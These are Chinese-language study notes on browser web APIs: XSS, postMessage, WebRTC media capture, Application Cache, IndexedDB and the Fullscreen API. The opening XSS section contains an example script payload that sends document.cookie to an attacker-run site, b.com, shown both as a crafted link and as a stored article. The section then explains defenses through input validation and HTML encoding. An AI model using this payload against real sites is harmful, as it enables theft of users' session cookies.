XSS'Cross SiteScript'跨站脚本攻击 
  PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
    理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
  原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
    当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
    如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
  DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
    Example:
      如一个获取他人Cookie的超链接,
      'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
      当点击这个链接的时候[假设点击者已经登录a.com],浏览器就会直接打开b.com,
      并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
      当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
      cookie信息中可能存有登录密码,攻击成功！
  Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
    Example:
      a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
      <script>window.open(“www.b.com?param=”+document.cookie)</script>,
      保存文章,这时当在查看攻击者的文章时就都中招了,
      他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
  XSS防御 
    永远不相信用户的输入,输入验证
    Html encode,对标签进行转换
      比如输入:'<script>window.location.href=”http://www.baidu.com”;</script>',
      最终存储的会是:
      '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
      在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
XDM'cross-document messaging'跨文档消息传递 [HTML5][IE9+]  
  PS: 可在不同域的页面间传递消息 
  targetWin.postMessage(mes,url)  当前页向目标窗口传递数据 
    PS: 目标窗口是指: 前页面中的<iframe>或由当前页打开的窗口
    targetWin  目标窗口window对象  
      如iframe的contentWindow属性、
      执行 window.open 返回的窗口对象、
      或者是命名过或数值索引的window.frames['name'] 
    mes  any,发送的消息 
      兼容性考虑,最好传递字符串,可使用JSON进行处理 
    url  str,指定信息接收的域  
      url指向的文档必须来源于指定的域,若匹配,消息会传递到框架中,否则无动作;
      "*" 表示可以把消息发送给来自任何域的文档
  targetWin.onmessage 事件 
    PS: 接收到XDM消息时,会触发window对象的message事件 
    e.data   
    e.origin 
    e.source 发送消息的文档的window对象的代理[访问不到window对象的其他信息] 
      这个代理对象主要用于在发送上一条消息的窗口中调用postMessage()方法。
      如果发送消息的窗口来自同一个域,那这个对象就是 window
  Chrome只支持当前页向当前页发送消息 
  Cross-document messaging 跨文档通信API
    为window对象新增了一个 window.postMessage 方法,
    允许跨窗口通信,不论这两个窗口是否同源。
  
    postMessage 父窗口 aaa.com 向子窗口 bbb.com 发消息
      var popup = window.open('http://bbb.com', 'title');
      popup.postMessage('Hello World!', 'http://bbb.com');
      postMessage方法的第一个参数是具体的信息内容,
      第二个参数是接收消息的窗口的源(origin),即“协议 + 域名 + 端口”。
      也可以设为*,表示不限制域名,向所有窗口发送。
      子窗口向父窗口发送消息的写法类似。
      window.opener.postMessage('Nice to see you', 'http://aaa.com');
    message事件 父窗口和子窗口监听对方的消息
      window.addEventListener('message', function(e) {
        console.log(e.data);
      },false);
      message事件的事件对象event,提供以下三个属性。
      event.source:发送消息的窗口
      event.origin: 消息发向的网址
      event.data: 消息内容
      下面的例子是,子窗口通过event.source属性引用父窗口,然后发送消息。
      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        event.source.postMessage('Nice to see you!', '*');
      }
      首先,receiveMessage函数里面没有过滤信息的来源,任意网址发来的信息都会被处理。
      其次,postMessage方法中指定的目标窗口的网址是一个星号,表示该信息可以向任意网址发送。
      通常来说,这两种做法是不推荐的,因为不够安全,可能会被恶意利用。
      event.origin 属性可以过滤不是发给本窗口的消息。
      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        if (event.origin !== 'http://aaa.com') return;
        if (event.data === 'Hello World') {
          event.source.postMessage('Hello', event.origin);
        } else {
          console.log(event.data);
        }
      }
      通过 window.postMessage,读写其他窗口的 LocalStorage 
        主窗口写入iframe子窗口的localStorage。
        window.onmessage = function(e) {
          if (e.origin !== 'http://bbb.com') {
            return;
          }
          var payload = JSON.parse(e.data);
          localStorage.setItem(payload.key, JSON.stringify(payload.data));
        };
        上面代码中,子窗口将父窗口发来的消息,写入自己的LocalStorage。
        
        父窗口发送消息的代码如下。
        
        var win = document.getElementsByTagName('iframe')[0].contentWindow;
        var obj = { name: 'Jack' };
        win.postMessage(JSON.stringify({key: 'storage', data: obj}), 'http://bbb.com');
        加强版的子窗口接收消息的代码如下。
        window.onmessage = function(e) {
          if (e.origin !== 'http://bbb.com') return;
          var payload = JSON.parse(e.data);
          switch (payload.method) {
            case 'set':
              localStorage.setItem(payload.key, JSON.stringify(payload.data));
              break;
            case 'get':
              var parent = window.parent;
              var data = localStorage.getItem(payload.key);
              parent.postMessage(data, 'http://aaa.com');
              break;
            case 'remove':
              localStorage.removeItem(payload.key);
              break;
          }
        };
        加强版的父窗口发送消息代码如下。
        
        var win = document.getElementsByTagName('iframe')[0].contentWindow;
        var obj = { name: 'Jack' };
        // 存入对象
        win.postMessage(JSON.stringify({key: 'storage', method: 'set', data: obj}), 'http://bbb.com');
        // 读取对象
        win.postMessage(JSON.stringify({key: 'storage', method: "get"}), "*");
        window.onmessage = function(e) {
          if (e.origin != 'http://aaa.com') return;
          // "Jack"
          console.log(JSON.parse(e.data).name);
        };
WebRTC'Web Real Time Communication'网络实时通信 [HTML5] 
  PS: 最初是为了解决浏览器上视频通话而提出的,
    即两个浏览器之间直接进行视频和音频的通信,不经过服务器。
    后来发展到除了音频和视频,还可以传输文字和其他数据。
    Google是WebRTC的主要支持者和开发者,它最初在Gmail上推出了视频聊天,
    后来在2011年推出了Hangouts,允许在浏览器中打电话。推动了WebRTC标准的确立。
  MediaStream,又称 getUserMedia  获取音频和视频 [HTML5]   
    PS: navigator.getUserMedia  在浏览器中获取音频(通过麦克风)和视频(通过摄像头)
      将来可以用于获取任意数据流,比如光盘和传感器
    检查浏览器是否支持getUserMedia方法
      PS:Chrome 21, Opera 18 和Firefox 17,支持该方法。
        目前,IE还不支持,上面代码中的msGetUserMedia,只是为了确保将来的兼容。
      navigator.getUserMedia  = navigator.getUserMedia ||
      navigator.webkitGetUserMedia ||
      navigator.mozGetUserMedia ||
      navigator.msGetUserMedia;
      if (navigator.getUserMedia) {
        // 支持
      } 
      else {
        // 不支持
      }
    navigator.getUserMedia(obj,onSuccess,onError);
      obj  对象,表示要获取哪些多媒体设备,
        { 
          video: true, 
          audio: true 
        } 
        表示获取摄像头和麦克风;
      onSuccess  回调函数,在获取多媒体设备成功时调用
        函数的参数是一个数据流对象stream。
        stream.getAudioTracks 方法和 stream.getVideoTracks 方法,
        分别返回一个数组,其成员是数据流包含的音轨和视轨(track)。
        使用的声音源和摄影头的数量,决定音轨和视轨的数量。
        比如,若只使用一个摄像头获取视频,且不获取音频,那么视轨的数量为1,音轨的数量为0。
        每个音轨和视轨,有一个kind属性,表示种类(video或者audio),
        和一个label属性(比如FaceTime HD Camera (Built-in))。
      onError    回调函数,在取多媒体设备失败时调用。
        函数接受一个Error对象作为参数。
        error.code.PERMISSION_DENIED    用户拒绝提供信息。
        error.code.NOT_SUPPORTED_ERROR  浏览器不支持硬件设备。
        error.code.MANDATORY_UNSATISFIED_ERROR 无法发现指定的硬件设备。
      Example:
        将摄像头拍摄的图像展示在网页上
        <video src="" controls="" id="camera"> </video>
        
        var constraints = {video: true};
        var vide = document.querySelector("#camera");
        function onSuccess(stream) {
          if (window.URL) {
            vide.src = window.URL.createObjectURL(stream);
          } 
          else { 
            vide.src = stream; 
          }
          vide.autoplay = true; 
          // 或者 vide.play();
        }
        function onError(error) {
          console.log("navigator.getUserMedia error: ", error);
        }
        if (navigator.getUserMedia) {
          navigator.getUserMedia(constraints, onSuccess, onError);
        } 
        else {
          vide.src = 'somevideo.mp4';
        }
        网页使用getUserMedia方法,浏览器就会询问用户,是否同意调用麦克风或摄像头;
        若用户同意,就调用回调函数onSuccess；
        若用户拒绝,就调用回调函数onError。
        浏览器兼容性
          Chrome中需使用https协议;
          Firefox中需使用mozGetUserMedia;
          vide.src
            大部分浏览器:
            URL.createObjectURL 方法将媒体数据流(MediaStream),
            转为一个二进制对象的URL(Blob URL),
            该URL可以作为video元素的src属性的值。 
            有些浏览器:
            媒体数据流可以直接作为src属性的值。
    Canvas API  ctx.drawImage(video, 0, 0)  可将视频的一个帧转为canvas元素
      PS:使得截屏变得非常容易。
      <video autoplay></video>
      <img src="">
      <canvas style="display:none;"></canvas>
      
      <script>
      var video = document.querySelector('video');
      var canvas = document.querySelector('canvas');
      var ctx = canvas.getContext('2d');
      var localMediaStream = null;
      function snapshot() {
        if (localMediaStream) {
          ctx.drawImage(video, 0, 0);
          // “image/webp”对Chrome有效,其他浏览器自动降为image/png
          document.querySelector('img').src = canvas.toDataURL('image/webp');
        }
      }
      video.addEventListener('click', snapshot, false);
      navigator.getUserMedia({video: true}, function(stream) {
        video.src = window.URL.createObjectURL(stream);
        localMediaStream = stream;
      }, errorCallback);
      </script>
    Web Audio API  通过浏览器捕获声音
      Example:
        捕获麦克风声音
        window.AudioContext = window.AudioContext || window.webkitAudioContext;
        var context = new AudioContext();
        function onSuccess(stream) {
          var audioInput = context.createMediaStreamSource(stream);
          audioInput.connect(context.destination);
        }
        navigator.getUserMedia({audio:true}, onSuccess);
    捕获的限定条件
      getUserMedia方法的第一个参数,除了指定捕获对象之外,还可以指定一些限制条件,
      比如限定只能录制高清(或者VGA标准)的视频。
      var hdConstraints = {
        video: {
          mandatory: {
            minWidth: 1280,
            minHeight: 720
          }
        }
      };
      navigator.getUserMedia(hdConstraints, onSuccess, onError);
      
      var vgaConstraints = {
        video: {
          mandatory: {
            maxWidth: 640,
            maxHeight: 360
          }
        }
      };
      navigator.getUserMedia(vgaConstraints, onSuccess, onError);
    MediaStreamTrack.getSources() 使用指定的媒体设备
      若本机有多个摄像头/麦克风,就需要使用 MediaStreamTrack.getSources 方法指定,
      到底使用哪一个摄像头/麦克风。
      function sourceSelected(audioSource, videoSource) {
        var constraints = {
          audio: {
            optional: [{sourceId: audioSource}]
          },
          video: {
            optional: [{sourceId: videoSource}]
          }
        };
        navigator.getUserMedia(constraints, onSuccess, onError);
      }
      MediaStreamTrack.getSources(function(sourceInfos) {
        var audioSource = null;
        var videoSource = null;
        for (var i = 0; i != sourceInfos.length; ++i) {
          var sourceInfo = sourceInfos[i];
          if (sourceInfo.kind === 'audio') {
            console.log(sourceInfo.id, sourceInfo.label || 'microphone');
            audioSource = sourceInfo.id;
          } 
          else if (sourceInfo.kind === 'video') {
            console.log(sourceInfo.id, sourceInfo.label || 'camera');
            videoSource = sourceInfo.id;
          } 
          else {
            console.log('Some other kind of source: ', sourceInfo);
          }
        }
        sourceSelected(audioSource, videoSource);
      });
      上面代码表示, MediaStreamTrack.getSources 方法的回调函数,
      可以得到一个本机的摄像头和麦克风的列表,然后指定使用最后一个摄像头和麦克风。
  RTCPeerConnection    进行音频和视频通信
    作用是在浏览器之间建立数据的“点对点”(peer to peer)通信,
    也就是将浏览器获取的麦克风或摄像头数据,传播给另一个浏览器。
    这里面包含了很多复杂的工作,比如信号处理、多媒体编码/解码、
    点对点通信、数据安全、带宽管理等等。
    不同客户端之间的音频/视频传递,是不用通过服务器的。
    但是,两个客户端之间建立联系,需要通过服务器。
    服务器主要转递两种数据:
      通信内容的元数据:
        打开/关闭对话(session)的命令、
        媒体文件的元数据(编码格式、媒体类型和带宽)等。
      网络通信的元数据: IP地址、NAT网络地址翻译和防火墙等。
    WebRTC协议没有规定与服务器的通信方式,因此可以采用各种方式, 比如WebSocket。
    通过服务器,两个客户端按照Session Description Protocol(SDP协议)交换双方的元数据。
    Example:
      var signalingChannel = createSignalingChannel();
      var pc;
      var configuration = ...;
      // run start(true) to initiate a call
      function start(isCaller) {
        pc = new RTCPeerConnection(configuration);
        
        // send any ice candidates to the other peer
        pc.onicecandidate = function (evt) {
          signalingChannel.send(JSON.stringify({ "candidate": evt.candidate }));
        };
        
        // once remote stream arrives, show it in the remote video element
        pc.onaddstream = function (evt) {
          remoteView.src = URL.createObjectURL(evt.stream);
        };
        
        // get the local stream, show it in the local video element and send it
        navigator.getUserMedia({ "audio": true, "video": true }, function (stream) {
          selfView.src = URL.createObjectURL(stream);
          pc.addStream(stream);
          
          if (isCaller)
          pc.createOffer(gotDescription);
          else
          pc.createAnswer(pc.remoteDescription, gotDescription);
          
          function gotDescription(desc) {
            pc.setLocalDescription(desc);
            signalingChannel.send(JSON.stringify({ "sdp": desc }));
          }
        });
      }
      signalingChannel.onmessage = function (evt) {
      if (!pc)
      start(false);
      
      var signal = JSON.parse(evt.data);
      if (signal.sdp)
      pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
      else
      pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
    };
    Chrome浏览器中为 webkitRTCPeerConnection ,
    Firefox浏览器中为 mozRTCPeerConnection。
    Google 维护一个函数库 adapter.js ,用来抽象掉浏览器之间的差异。
  RTCDataChannel       进行任意数据的通信
    作用是在点对点之间,传播任意数据。它的API与WebSockets的API相同。
    Example:
      var pc = new webkitRTCPeerConnection(servers, {
        optional: [{RtpDataChannels: true}]
      });
      pc.ondatachannel = function(event) {
        receiveChannel = event.channel;
        receiveChannel.onmessage = function(event){
          document.querySelector("div#receive").innerHTML = event.data;
        };
      };
      sendChannel = pc.createDataChannel("sendDataChannel", {reliable: false});
      document.querySelector("button#send").onclick = function (){
        var data = document.querySelector("textarea#send").value;
        sendChannel.send(data);
      };
      Chrome 25、Opera 18 和Firefox 22 支持RTCDataChannel。
  外部函数库 
    由于API比较复杂,一般采用外部函数库进行操作。
    目前,视频聊天的函数库有 SimpleWebRTC easyRTC webRTC.io,
    点对点通信的函数库有PeerJS、Sharefest。
    Example: SimpleWebRTC的示例
      var webrtc = new WebRTC({
        localVideoEl: 'localVideo',
        remoteVideosEl: 'remoteVideos',
        autoRequestMedia: true
      });
      webrtc.on('readyToCall', function () {
          webrtc.joinRoom('My room name');
      });
    Example:PeerJS的示例
      var peer = new Peer('someid', {key: 'apikey'});
      peer.on('connection', function(conn) {
        conn.on('data', function(data){
          // Will print 'hi!'
          console.log(data);
        });
      });
      
      // Connecting peer
      var peer = new Peer('anotherid', {key: 'apikey'});
      var conn = peer.connect('someid');
      conn.on('open', function(){
        conn.send('hi!');
      });
'Application Cache'应用离线缓存: 让Web应用在离线状态下可继续使用 [HTML5]
  PS: 通过manifest文件指明需要缓存的资源; 移动端支持度比较好;
  指定页面缓存: 
    在文档的<html>标签中包含'manifest'属性,值为manifest文件的路径 
    若未指定manifest属性,则页面不会被缓存,除非在manifest文件中直接指定了该页面;
  'xx.appcache'manifest文件: 
    PS: 需在web服务器上配置正确的 MIME-type,即 "text/cache-manifest"; 
    CACHE MANIFEST # 此标题下列出的文件将在首次下载后进行缓存 
      # 2012-02-21 v1.0.0
      CACHE:
      /theme.css
      /logo.gif
      /main.js
    NETWORK:       # 此标题下列出的文件需要与服务器的连接,且不会被缓存 
      # 每次重新拉取的文件
      * [表示除 CACHE 中指定的文件其他全部]
      login.asp
    FALLBACK:      # 此标题下列出的文件规定当页面无法访问时的回退页面,比如 404 页面 
      # 离线状态下代替文件 
      /404.html 
  Example: 
    // manifest文件中
    CACHE MANIFEST
    #version 1.1
    CACHE:
      img/1.jpg
      img/2.jpg
      css/assets.css
    NETWORK:
      *
    // html中
    <!DOCTYPE html>
    <html manifest="./manifest.appcache"> 
      <head>
        <meta charset="utf-8">
        <title>app cache demo</title>
      </head>
      <body>
        <h1>app cache demo</h1>
        <ul>
          <li><img src="img/1,jpg" alt=""></li>
          <li><img src="img/2,jpg" alt=""></li>
        </ul>
      </body>
      <script type="text/javascript">
      window.addEventListener("load",function(e){
        window.applicationCache.addEventListener("updateready",function(e){
          console.log(window.applicationCache.status);
          if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
            window.applicationCache.swapCache();
            if (confirm('a new version of this site is available,load it?')) {
              window.location.reload();
            }
          }
          else {
            console.log('manifest don\'t change');
          }
        },false)
      },false)
        
      </script>
    </html>
    
    在服务器添加mime-types text/cache-manifest
      如在 xampp->apache->conf->mime.types 中
      添加 text/cache-manifest  appcache
  applicationCache 核心对象
    applicationCache.status; 表示应用缓存的状态值
      0  无缓存,没有与页面相关的应用缓存
      1  闲置,应用缓存未得到更新
      2  检查中,正在下载描述文件并检查更新
      3  下载中,应用缓存正在下载描述文件中指定的资源
      4  更新完成,应用缓存已经更新了资源,且所有资源都已下载完毕,可通过swapCache()来使用了
      5  废弃,应用缓存的描述文件已经不存在了,此页面无法再访问应用缓存
    ◆事件
    checking  在浏览器为应用缓存查找更新时触发
    error     在检查更新或下载资源期间发生错误时触发
    noupdate  在检查描述文件发现文件无变化时触发
    downloading 在开始下载应用缓存资源时触发
    progress  在文件下载应用缓存的过程中持续不断的触发
    updateready 在页面新的应用缓存下载完毕且可以通过swapCache()使用时触发
    cached    在应用缓存完整可用时触发
IndexedDB,浏览器端数据库 [HTML5] 
  PS: IE 10+支持,但是Safari完全不支持[?];
    能够在客户端持久的储存结构化数据的数据库,并且提供了丰富的查询能力;
    按域名分配独立空间[如a.qq.com 和 b.qq.com],一个域名下可以创建多个数据库,
    每个数据库可以创建多个对象储存空间[表],
    一个对象储存空间可以储存多个对象数据
  概述 
    随着浏览器的处理能力不断增强,越来越多的网站开始考虑,将大量数据储存在客户端,
    这样可以减少用户等待从服务器获取数据的时间。
    现有的浏览器端数据储存方案,都不适合储存大量数据;
    cookie不超过4KB,且每次请求都会发送回服务器端;
    Window.name 属性缺乏安全性,且没有统一的标准;
    localStorage在 2.5 M 到 10 MB 之间[DiBs];
    可以被网页脚本程序创建和操作,它允许储存大量数据,提供查找接口,还能建立索引。
    IndexedDB不属于关系型数据库[不支持SQL查询语句],更接近NoSQL数据库。
  特点 
    1、键值对储存 
      IndexedDB内部采用对象仓库[object store]存放数据。
      所有类型的数据都可以直接存入,包括JavaScript对象。
      在对象仓库中,数据以“键值对”的形式保存,
      每一个数据都有对应的键名,键名是独一无二的,不能有重复,否则会抛出一个错误。
    2、异步
      IndexedDB操作时不会锁死浏览器,用户依然可以进行其他操作,
      这与localStorage形成对比,后者的操作是同步的。
      异步设计是为了防止大量数据的读写,拖慢网页的表现。
    3、支持事务。 
      IndexedDB支持事务[transaction],
      意味着一系列操作步骤之中,只要有一步失败,整个事务就都取消,
      数据库回到事务发生之前的状态,不存在只改写一部分数据的情况。
    4、同域限制 
      IndexedDB也受到同域限制,每一个数据库对应创建该数据库的域名。
      来自不同域名的网页,只能访问自身域名下的数据库,而不能访问其他域名下的数据库。
    5、储存空间大 
      IndexedDB的储存空间比localStorage大得多,一般来说不少于250MB。
      IE的储存上限是250MB,Chrome和Opera是剩余空间的某个百分比,Firefox则没有上限。
    6、支持二进制储存。
       IndexedDB不仅可以储存字符串,还可以储存二进制数据。
  检查浏览器是否支持该API及兼容写法 
    if("indexedDB" in window) {
      console.log('支持');
    } 
    else {
      console.log('不支持');
    }
    兼容写法
    var indexedDB = window.indexedDB || window.webkitIndexedDB 
    || window.mozIndexedDB || window.msIndexedDB;
  var openRequest = indexedDB.open(str[,num]);  打开数据库,不存在则创建
    str   字符串,数据库名称
    num   大于 0 的正整数[0 将报错],数据库版本,可选,默认为1
  打开数据库事件 
    PS:open方法返回的是一个对象[IDBOpenDBRequest],事件在该对象上触发
    success 打开成功
    error   打开失败
    upgradeneeded 第一次打开该数据库,或者数据库版本发生变化时 
      第一次打开数据库时,会先触发upgradeneeded事件,然后触发success事件。
    blocked       上一次的数据库连接还未关闭 
    event,事件对象
      event.target.result 指向打开的IndexedDB数据库
    Example:
      var openRequest = indexedDB.open("test",1);
      var db;
      openRequest.onupgradeneeded = function(e) {
        console.log("Upgrading...");
      }
      openRequest.onsuccess = function(e) {
        console.log("Success!");
        db = e.target.result;
      }
      openRequest.onerror = function(e) {
        console.log("Error");
        console.dir(e);
      }
  ◆数据库对象实例的方法、属性
    PS:获得数据库实例以后,就可以用实例对象的方法操作数据库。
  db.createObjectStore(str[,obj]); 用于创建存放数据的“对象仓库” 
    PS:类似于传统关系型数据库的表格;若该对象仓库已经存在,就会抛出一个错误;
    str 字符串,对象仓库的名称
    obj 对象,用于设置对象仓库的属性
      db.createObjectStore("test", { keyPath: "email" }); 
      db.createObjectStore("test2", { autoIncrement: true });
      keyPath 表示所存入对象的email属性用作每条记录的键名
        [由于键名不能重复,所以存入之前必须保证数据的email属性值都是不一样的],默认值为null；
      autoIncrement 表示是否使用自动递增的整数作为键名[第一个数据为1,第二个数据为2,以此类推]
        默认为false。 一般来说,keyPath和autoIncrement属性只要使用一个就够了,
        若两个同时使用,表示键名为递增的整数,且对象不得缺少指定属性。
  db.objectStoreNames  返回一个DOMStringList对象 
    里面包含了当前数据库所有“对象仓库”的名称。
    db.objectStoreNames.contains(str)  检查数据库是否包含某个“对象仓库”
      if(!db.objectStoreNames.contains("firstOS")) {
        db.createObjectStore("firstOS");
      }
      判断某个“对象仓库”是否存在,若不存在就创建该对象仓库。
  ◆数据库事务对象
  var dbt = db.transaction(arr,option);  返回一个事务对象 
    PS:向数据库添加数据之前,必须先创建数据库事务。
    arr     数组,里面是所涉及的对象仓库,通常是只有一个
    option  字符串,表示操作类型,目前,操作类型只有两种
      添加数据使用readwrite,读取数据使用readonly。
      readonly  只读
      readwrite 读写
  var store = dbt.objectStore("firstOS");  用于获取指定的对象仓库
  事务对象的三个事件,可以用来定义回调函数
    abort    事务中断
    complete 事务完成
    error    事务出错
    var dbt = db.transaction(["note"], "readonly");  
    dbt.oncomplete = function(event) {
      // some code
    };
  ◆事务对象的方法,用于操作数据。
  var request = store.add(o,1); 添加数据
    获取对象仓库以后,就可以用add方法往里面添加数据了。
    var store = dbt.objectStore("firstOS");
    var o = {p: 123};
    var request = store.add(o,1);
    add方法的第一个参数是所要添加的数据,
    第二个参数是这条数据对应的键名(key),上面代码将对象o的键名设为1。
    若在创建数据仓库时,对键名做了设置,这里也可以不指定键名。
    success和error事件
      add方法是异步的,有自己的success和error事件
      var request = store.add(o,1);
      request.onerror = function(e) {
        // error handler
        console.log("Error",e.target.error.name); 
      }
      request.onsuccess = function(e) {
        console.log("数据添加成功！");
      }
  var ob = store.get(x); 读取数据
    参数是数据的键名
    var t = db.transaction(["test"], "readonly");
    var store = dbt.objectStore("test");
    var ob = store.get(x);
    get方法也是异步的,会触发自己的success和error事件,可以对它们指定回调函数。
      var ob = store.get(x);
      ob.onsuccess = function(e) {
        // ...
      }
  从创建事务到读取数据,所有操作方法也可以写成下面这样链式形式。
    db.transaction(["test"], "readonly")
    .objectStore("test")
    .get(X)
    .onsuccess = function(e){}
  var request = store.put(o, 1); 更新记录
    put方法的用法与add方法相近。
    var o = { p:456 };
    var request = store.put(o, 1);
  var request = store.delete(thisId); 删除记录
    var t = db.transaction(["people"], "readwrite");
    var request = dbt.objectStore("people").delete(thisId);
    delete方法的参数是数据的键名。另外,delete也是一个异步操作,可以为它指定回调函数。
  var cursor = store.openCursor(); 遍历数据
    若想要遍历数据,就要openCursor方法,它在当前对象仓库里面建立一个读取光标(cursor)。
    var t = db.transaction(["test"], "readonly");
    var store = dbt.objectStore("test");
    var cursor = store.openCursor();
    openCursor方法也是异步的,有自己的success和error事件,可以对它们指定回调函数。
      cursor.onsuccess = function(e) {
        var res = e.target.result;
        if(res) {
          console.log("Key", res.key);
          console.dir("Data", res.value);
          res.continue();
        }
      }
      回调函数接受一个事件对象作为参数,该对象的 target.result 属性指向当前数据对象。
      当前数据对象的 key 和 value 分别返回键名和键值[即实际存入的数据]。
      continue 方法将光标移到下一个数据对象,
      若当前数据对象已经是最后一个数据了,则光标指向null。
    openCursor方法还可以接受第二个参数,表示遍历方向,默认值为next,
      其他可能的值为prev、nextunique和prevunique。
      后两个值表示若遇到重复值,会自动跳过。
  store.createIndex 用于创建索引
    假定对象仓库中的数据对象都是下面person类型的。
    var person = {
      name:name,
      email:email,
      created:new Date()
    }
    可以指定这个数据对象的某个属性来建立索引。
    var store = db.createObjectStore("people", { autoIncrement:true });
    store.createIndex("name","name", {unique:false});
    store.createIndex("email","email", {unique:true});
    createIndex方法接受三个参数,
    第一个是索引名称,
    第二个是建立索引的属性名,
    第三个是参数对象,用来设置索引特性。
    unique表示索引所在的属性是否有唯一值,上面代码表示name属性不是唯一值,email属性是唯一值。
  var request = index.get(name); 从对象仓库返回指定的索引
    有了索引以后,就可以针对索引所在的属性读取数据。
    var t = db.transaction(["people"],"readonly");
    var store = dbt.objectStore("people");
    var index = store.index("name");
    var request = index.get(name);
    上面代码打开对象仓库以后,先用index方法指定索引在name属性上面,
    然后用get方法读取某个name属性所在的数据。
    若没有指定索引的那一行代码,get方法只能按照键名读取数据,
    而不能按照name属性读取数据。
    需要注意的是,这时get方法有可能取回多个数据对象,因为name属性没有唯一值。
    另外,get是异步方法,读取成功以后,只能在success事件的回调函数中处理数据。
  IDBKeyRange对象
    索引的有用之处,还在于可以指定读取数据的范围。
    这需要用到浏览器原生的IDBKeyRange对象。
    IDBKeyRange对象的作用是生成一个表示范围的Range对象。生成方法有四种:
    lowerBound方法:指定范围的下限。
    upperBound方法:指定范围的上限。
    bound方法:指定范围的上下限。
    only方法:指定范围中只有一个值。
    下面是一些代码实例:
    // All keys ≤ x  
    var r1 = IDBKeyRange.upperBound(x);
    
    // All keys < x  
    var r2 = IDBKeyRange.upperBound(x, true);
    
    // All keys ≥ y  
    var r3 = IDBKeyRange.lowerBound(y);
    
    // All keys > y  
    var r4 = IDBKeyRange.lowerBound(y, true);
    
    // All keys ≥ x && ≤ y  
    var r5 = IDBKeyRange.bound(x, y);
    
    // All keys > x &&< y  
    var r6 = IDBKeyRange.bound(x, y, true, true);
    
    // All keys > x && ≤ y  
    var r7 = IDBKeyRange.bound(x, y, true, false);
    
    // All keys ≥ x &&< y  
    var r8 = IDBKeyRange.bound(x, y, false, true);
    
    // The key = z  
    var r9 = IDBKeyRange.only(z);
    前三个方法(lowerBound、upperBound和bound)默认包括端点值,可以传入一个布尔值,修改这个属性。
    
    生成Range对象以后,将它作为参数输入openCursor方法,就可以在所设定的范围内读取数据。
    var t = db.transaction(["people"],"readonly");
    var store = dbt.objectStore("people");
    var index = store.index("name");
    
    var range = IDBKeyRange.bound('B', 'D');
    
    index.openCursor(range).onsuccess = function(e) {
      var cursor = e.target.result;
      if(cursor) {
        console.log(cursor.key + ":");
        for(var field in cursor.value) {
          console.log(cursor.value[field]);
        }
        cursor.continue();
      }
    }  
  Example:
Fullscreen,全屏操作[HTML5] 
  PS: 全屏API可以控制浏览器的全屏显示,让一个Element节点[以及子节点]占满用户的整个屏幕
    目前各大浏览器的最新版本都支持这个API[包括IE11],但是使用的时候需要加上浏览器前缀
    放大一个节点时,Firefox和Chrome在行为上略有不同。
    Firefox自动为该节点增加一条CSS规则,将该元素放大至全屏状态,width:100%; height:100%,
    而Chrome则是将该节点放在屏幕的中央,保持原来大小,其他部分变黑。
    用户手动按下ESC键或F11键,也可以退出全屏键;
    加载新页面,或切换tab,或从浏览器转向其他应用[按下Alt-Tab],也会导致退出全屏状态;
  elem.requestFullscreen() 使该节点全屏
    PS:在Chrome/Firefox等浏览器中直接使用直接使元素节点全屏,会被拒绝
    function requestFullscreen(element) {
      if(element.requestFullscreen) {
        element.requestFullscreen();
      } 
      else if(element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
      } 
      else if(element.msRequestFullscreen){
        element.msRequestFullscreen();
      } 
      else if(element.webkitRequestFullscreen) {
        element.webkitRequestFullScreen();
      }
      else {
        alert('该浏览器不支持全屏');
      }
    }
    requestFullscreen(document.documentElement);
    requestFullscreen(document.getElementById("videoElement"));
    为了让Chrome的行为与Firefox保持一致,可以自定义一条CSS规则。
      :-webkit-full-screen #myvideo {
        width: 100%;
        height: 100%;
      }
  document.exitFullscreen()  用于取消全屏[该方法也带有浏览器前缀]
    function exitFullscreen() {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } 
      else if (document.msExitFullscreen) {
        document.msExitFullscreen();
      } 
      else if (document.mozCancelFullScreen) {
        document.mozCancelFullScreen();
      } 
      else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
      }
    }
    exitFullscreen();
  document.fullscreenElement 返回正处于全屏状态的Element节点,
    PS:若当前没有节点处于全屏状态,则返回null。
    var fullscreenElement = document.fullscreenElement 
    || document.mozFullScreenElement 
    || document.webkitFullscreenElement;
  document.fullscreenEnabled 表示当前文档是否可以切换到全屏状态的布尔值
    var fullscreenEnabled = document.fullscreenEnabled 
    || document.mozFullScreenEnabled 
    || document.webkitFullscreenEnabled 
    || document.msFullscreenEnabled;
  fullscreenchange  浏览器进入或离开全屏时在document上触发事件
    document.addEventListener("fullscreenchange", function( event ) {
      if (document.fullscreenElement) {
        console.log('进入全屏');
      } 
      else {
        console.log('退出全屏');
      }
    });
  fullscreenerror   浏览器无法进入全屏时触发事件,可能是技术原因,也可能是用户拒绝
  全屏状态的CSS 
    全屏状态下,大多数浏览器的CSS支持:full-screen伪类,只有IE11支持:fullscreen伪类。
    使用这个伪类,可以对全屏状态设置单独的CSS属性。
    :-webkit-full-screen {
      /* properties */
    }
    :-moz-full-screen {
      /* properties */
    }

    :-ms-fullscreen {
      /* properties */
    }

    :full-screen { /*pre-spec */
      /* properties */
    }

    :fullscreen { /* spec */
      /* properties */
    }
    /* deeper elements */
    :-webkit-full-screen video {
      width: 100%;
      height: 100%;
    }
--------------------------------------------------------------------------------
移动端 
